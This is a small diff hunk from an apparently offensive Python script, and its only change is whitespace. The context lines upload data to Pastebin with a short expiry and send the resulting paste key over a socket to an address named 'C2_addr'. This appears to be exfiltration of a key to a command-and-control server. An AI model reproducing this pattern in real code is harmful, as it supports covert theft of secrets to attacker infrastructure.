@@ -103,7 +103,7 @@ def main():
                 'api_paste_expire_date': '10M'}
     key_url = requests.post(url=pastebin_url, data=key_data)
     print(key_url.text)  # print out url of paste
-
+    
     key_string = key_url.split('/')[-1]
     sock.sendto(key_string.encode(), C2_addr)
 
